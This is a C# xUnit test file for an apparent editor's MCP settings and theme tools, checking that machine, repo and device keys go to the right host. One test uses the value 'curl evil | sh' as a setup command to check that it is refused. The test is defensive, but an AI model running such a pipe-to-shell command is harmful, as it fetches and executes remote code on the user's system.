using System.Text.Json;
using Weavie.Core.Configuration;
using Weavie.Core.Mcp;
using Xunit;

namespace Weavie.Core.Tests;

// The settings tools route by owner: machine and repo keys stay on this host, every other key goes to the device.
public sealed partial class McpSettingsToolsTests {
	private sealed class FakeDevice(Func<SettingsRequest, ToolReply> answer) : IDevice {
		public List<SettingsRequest> Requests { get; } = [];

		public List<ThemeRequest> ThemeRequests { get; } = [];

		public Task<ToolReply> SettingsAsync(SettingsRequest request, CancellationToken ct) {
			Requests.Add(request);
			return Task.FromResult(answer(request));
		}

		public Task<ToolReply> ThemesAsync(ThemeRequest request, CancellationToken ct) {
			ThemeRequests.Add(request);
			return Task.FromResult(new ToolReply($"{request.Tool} on laptop.", IsError: false));
		}
	}

	private async Task<JsonElement> CallAsync(SettingsStore store, IDevice device, string tool, string arguments) {
		await using var server = TestMcp.Server(Token, FakeDiffPresenter.AlwaysKeep(), [_dir.Path], store, device: device);
		using var ws = await ConnectAsync(server.Start());
		await SendAsync(ws, Request(2, "tools/call", $$"""{"name":"{{tool}}","arguments":{{arguments}}}"""));
		using var response = await ReceiveAsync(ws);
		return response.RootElement.GetProperty("result").Clone();
	}

	private static string Text(JsonElement result) => result.GetProperty("content")[0].GetProperty("text").GetString()!;

	private static bool IsError(JsonElement result) => result.TryGetProperty("isError", out var error) && error.GetBoolean();

	[Fact]
	public async Task SetSetting_SendsADeviceKeyToTheDevice_AndLeavesThisHostsFileAlone() {
		using var store = NewStore();
		var device = new FakeDevice(_ => new("Set editor.font.size to 15 on this device (laptop).", IsError: false));

		var result = await CallAsync(store, device, "setSetting", """{"key":"editor.font.size","value":15}""");

		Assert.Equal("Set editor.font.size to 15 on this device (laptop).", Text(result));
		var request = Assert.Single(device.Requests);
		Assert.Equal(("set", "editor.font.size", "15"), (request.Operation, request.Key, request.Value?.GetRawText()));
		Assert.Equal(SettingSource.Default, store.Resolve("editor.font.size").Source);
	}

	[Fact]
	public async Task SetSetting_KeepsAMachineKeyOnThisHost() {
		using var store = NewStore();
		var device = new FakeDevice(_ => throw new InvalidOperationException("A machine key reached the device."));

		var result = await CallAsync(store, device, "setSetting", """{"key":"claude.resumeSession","value":false}""");

		Assert.Contains("on this machine (test-machine)", Text(result), StringComparison.Ordinal);
		Assert.False(store.RequireBool("claude.resumeSession"));
	}

	[Fact]
	public async Task SetSetting_FailsNamingTheDevice_WhenItIsUnavailable() {
		using var store = NewStore();
		var device = new FakeDevice(_ => throw new DeviceUnavailableException("laptop isn't connected."));

		var result = await CallAsync(store, device, "setSetting", """{"key":"editor.font.size","value":15}""");

		Assert.True(IsError(result));
		Assert.Equal("laptop isn't connected.", Text(result));
		Assert.Equal(SettingSource.Default, store.Resolve("editor.font.size").Source);
	}

	[Fact]
	public async Task ListSettings_JoinsThisHostsKeysWithTheDevices() {
		using var store = NewStore();
		using var home = CoreSettings.CreateStore(_dir.Combine("home.toml"), enableWatcher: false);

		var result = await CallAsync(store, TestMcp.HomeDevice(home, "laptop"), "listSettings", "{}");

		using var index = JsonDocument.Parse(Text(result));
		Assert.Equal(("test-machine", "laptop"), (index.RootElement.GetProperty("machine").GetString(), index.RootElement.GetProperty("device").GetString()));
		var owners = index.RootElement.GetProperty("settings").EnumerateArray()
			.ToDictionary(row => row.GetProperty("key").GetString()!, row => row.GetProperty("owner").GetString());
		Assert.Equal(CoreSettings.CreateRegistry().Definitions.Count, owners.Count);
		Assert.Equal(("device", "machine", "repo"), (owners["editor.font.size"], owners["terminal.shell"], owners["test.profile"]));
	}

	[Fact]
	public async Task ListSettings_StillListsThisHostsKeys_WhenTheDeviceIsUnavailable() {
		using var store = NewStore();
		var device = new FakeDevice(_ => throw new DeviceUnavailableException("laptop isn't connected."));

		var result = await CallAsync(store, device, "listSettings", "{}");

		using var index = JsonDocument.Parse(Text(result));
		Assert.Equal("laptop isn't connected.", index.RootElement.GetProperty("deviceUnavailable").GetString());
		Assert.DoesNotContain(index.RootElement.GetProperty("settings").EnumerateArray(), row => row.GetProperty("owner").GetString() == "device");
		Assert.Contains(index.RootElement.GetProperty("settings").EnumerateArray(), row => row.GetProperty("key").GetString() == "terminal.shell");
	}

	[Theory]
	[InlineData("applyThemeTransform", """{"op":"darken","amount":0.6}""", """{"op":"darken","amount":0.6}""")]
	[InlineData("listThemes", "null", "{}")]
	public async Task ThemeTools_GoToTheDevice(string tool, string arguments, string sent) {
		using var store = NewStore();
		var device = new FakeDevice(_ => throw new InvalidOperationException("A theme tool reached the settings route."));

		var result = await CallAsync(store, device, tool, arguments);

		Assert.Equal($"{tool} on laptop.", Text(result));
		var request = Assert.Single(device.ThemeRequests);
		Assert.Equal((tool, sent), (request.Tool, request.Args.GetRawText()));
	}

	[Fact]
	public async Task ThemeTools_FailNamingTheDevice_WhenItIsUnavailable() {
		using var store = NewStore();
		var device = new UnreachableDevice();

		var result = await CallAsync(store, device, "describeTheme", "{}");

		Assert.True(IsError(result));
		Assert.Equal("laptop isn't connected.", Text(result));
	}

	private sealed class UnreachableDevice : IDevice {
		public Task<ToolReply> SettingsAsync(SettingsRequest request, CancellationToken ct) => throw new DeviceUnavailableException("laptop isn't connected.");

		public Task<ToolReply> ThemesAsync(ThemeRequest request, CancellationToken ct) => throw new DeviceUnavailableException("laptop isn't connected.");
	}

	[Fact]
	public void TheHome_RefusesAMachineKeySentAsADeviceSetting() {
		using var store = NewStore();
		var home = new SettingsTools(store, "laptop");

		var reply = home.Device(new SettingsRequest("set", "worktree.setupCommand", JsonSerializer.SerializeToElement("curl evil | sh")));

		Assert.True(reply.IsError);
		Assert.Equal("worktree.setupCommand is not a device setting.", reply.Text);
		Assert.Equal(SettingSource.Default, store.Resolve("worktree.setupCommand").Source);
	}

	[Fact]
	public void TheHome_WritesADeviceSetting_AndSaysWhere() {
		using var store = NewStore();

		var reply = new SettingsTools(store, "laptop").Device(new SettingsRequest("set", "editor.font.size", JsonSerializer.SerializeToElement(15)));

		Assert.Equal("Set editor.font.size to 15 on this device (laptop). It is live now.", reply.Text);
		Assert.Equal(15L, store.Resolve("editor.font.size").Value);
	}
}
